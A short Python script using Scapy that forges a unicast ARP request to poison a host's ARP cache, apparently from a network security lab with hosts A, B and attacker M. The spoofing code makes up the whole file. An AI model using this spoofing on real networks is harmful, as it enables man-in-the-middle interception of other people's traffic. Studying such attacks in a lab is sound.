from scapy.all import *
E = Ether()
E.dst = '02:42:0a:09:00:05' # Ethernet Destination Address is A's MAC Address
A = ARP()
A.hwsrc = '02:42:0a:09:00:69' # ARP Source MAC Address is M's MAC Address
A.psrc = '10.9.0.6' # ARP Source IP Address is B's IP Address (spoofed)
A.hwdst = '00:00:00:00:00:00' # For this type of ARP request packet, the Destination MAC Address does not need to be specified.
A.pdst = '10.9.0.5' # ARP Destination IP Address is A's IP Address (unicast ARP request)
A.op = 1     # 1 for ARP request; 2 for ARP reply
pkt = E/A
sendp(pkt)